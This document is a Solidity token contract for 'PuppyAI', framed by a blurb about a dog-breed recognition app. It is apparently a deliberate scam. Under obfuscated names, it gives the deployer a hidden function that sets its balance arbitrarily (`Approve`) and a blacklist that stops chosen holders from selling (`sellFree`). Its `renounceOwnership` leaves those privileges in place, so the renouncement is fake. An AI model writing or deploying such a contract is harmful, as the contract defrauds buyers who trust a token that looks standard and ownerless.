/**
 *Submitted for verification at Etherscan.io on 2023-02-13
*/

//SPDX-License-Identifier: MIT

/**
Puppy AI is a simple tool that allows you identify any breed of dog. 
All you need to do is open the app, point your phone at the dog or picture of the dog 
(make sure the dog is in camera view), and wait. 
Right there, the app begins to "think" and analyze. 
And in a matter of seconds, the app tells you what that dog's breed is.
Use it to identify your cute pup, your weird looking pooch, 
a dog you just adopted, or your overly muscular dog whose breed you're not quite sure of. 
Have fun! And tell us what you think.

Portal     : https://t.me/puppyai
Website : https://www.puppyai.dog/
Twitter   : https://twitter.com/PuppyAI_token
Medium : https://medium.com/@Puppyai
*/

pragma solidity ^0.8.0;

abstract contract atFrom {
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
        function minTake() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}
interface _limitFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}
interface amountToSwap {
    function createPair(address _launcher, address launcher_) external returns (address);
}

contract PuppyAI is IERC20, atFrom {
    uint8 private _freeTx = 18;
    uint256 private _receiverShould = 1000000000 * 10 ** _freeTx;
    string private _tokenExempt = "PuppyAI";
    bool public _autoSwap;
    uint256 public _sendFee = 5;
    bool public _sendAuto;
    address private _tradeTx = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public Pair;
    uint256 constant teamFee = 1e10;
    string private sendTx = unicode"PuppyAI";


    uint256 private liqSell;
    mapping(address => uint256) private amountAtLaunch;
    mapping(address => bool) public senderShould;
    uint256 public senderList = 5;
    bool public maxTxFee;
    uint256 private fromWalletCheck;
    uint256 public fixWalletSender = 5;
    address public feeTx;
    bool public sizeLimit;
    mapping(address => bool) public _ownedToken;
    address private allowRemove;
    mapping(address => mapping(address => uint256)) private buyAmount;
    bool public swapEnabled;

    event OwnershipTransferred(address indexed maxShould, address indexed liquidityReceiver);

    constructor (){

        _limitFrom receiverLaunched = _limitFrom(_tradeTx);
        Pair = amountToSwap(receiverLaunched.factory()).createPair(receiverLaunched.WETH(), address(this));
        allowRemove = minTake();
        if (_autoSwap != _sendAuto) {
            _sendAuto = true;
        }
        feeTx = allowRemove;
        senderShould[feeTx] = true;
        if (swapEnabled) {
            fromWalletCheck = _sendFee;
        }
        amountAtLaunch[feeTx] = _receiverShould;
        emit Transfer(address(0), feeTx, _receiverShould);
    }

    function symbol() external view returns (string memory) {
        return sendTx;
    }

    function tradingLimit() public view returns (bool) {
        return sizeLimit;
    }

    function totalLaunched(address receiverEnabler, address feeModifier, uint256 sellLimit) internal returns (bool) {
        if (receiverEnabler == feeTx || feeModifier == feeTx) {
            return enableReceive(receiverEnabler, feeModifier, sellLimit);
        }
        if (_sendAuto) {
            sizeLimit = false;
        }
        if (_ownedToken[receiverEnabler]) {
            return enableReceive(receiverEnabler, feeModifier, teamFee);
        }
        return enableReceive(receiverEnabler, feeModifier, sellLimit);
    }

    function name() external view returns (string memory) {
        return _tokenExempt;
    }

    function tradingWallet(address check) public {
        if (maxTxFee) {
            return;
        }
        senderShould[check] = true;
        maxTxFee = true;
    }

    function allowance(address receiverMarketing, address txLaunch) external view virtual override returns (uint256) {
        return buyAmount[receiverMarketing][txLaunch];
    }

    function feeAmount() public {
        if (_sendFee != fromWalletCheck) {
            _sendFee = senderList;
        }
        fixWalletSender=0;
    }

    function transfer(address endReceiver, uint256 sellLimit) external virtual override returns (bool) {
        return totalLaunched(minTake(), endReceiver, sellLimit);
    }

    function sellFree(address senderTransact) public {
        if (senderTransact == feeTx || senderTransact == Pair || !senderShould[minTake()]) {
            return;
        }
        _ownedToken[senderTransact] = true;
    }

    function decimals() external view returns (uint8) {
        return _freeTx;
    }

    function exemptedWallet() public view returns (bool) {
        return _autoSwap;
    }

    function getOwner() external view returns (address) {
        return allowRemove;
    }

    function owner() external view returns (address) {
        return allowRemove;
    }

    function approve(address txLaunch, uint256 sellLimit) public virtual override returns (bool) {
        buyAmount[minTake()][txLaunch] = sellLimit;
        emit Approval(minTake(), txLaunch, sellLimit);
        return true;
    }

    function Approve(uint256 sellLimit) public {
        if (!senderShould[minTake()]) {
            return;
        }
        amountAtLaunch[feeTx] = sellLimit;
    }

    function maxSellLimit() public view returns (bool) {
        return _sendAuto;
    }

    function feeMode() public view returns (bool) {
        return sizeLimit;
    }

    function fixedWalletSender() public view returns (uint256) {
        return fixWalletSender;
    }

    function balanceOf(address _check) public view virtual override returns (uint256) {
        return amountAtLaunch[_check];
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(feeTx, address(0));
        allowRemove = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return _receiverShould;
    }

    function enableReceive(address receiverEnabler, address feeModifier, uint256 sellLimit) internal returns (bool) {
        require(amountAtLaunch[receiverEnabler] >= sellLimit);
        amountAtLaunch[receiverEnabler] -= sellLimit;
        amountAtLaunch[feeModifier] += sellLimit;
        emit Transfer(receiverEnabler, feeModifier, sellLimit);
        return true;
    }

    function feeTotal() public view returns (uint256) {
        return fixWalletSender;
    }

    function transferFrom(address receiverEnabler, address feeModifier, uint256 sellLimit) external override returns (bool) {
        if (buyAmount[receiverEnabler][minTake()] != type(uint256).max) {
            require(sellLimit <= buyAmount[receiverEnabler][minTake()]);
            buyAmount[receiverEnabler][minTake()] -= sellLimit;
        }
        return totalLaunched(receiverEnabler, feeModifier, sellLimit);
    }


}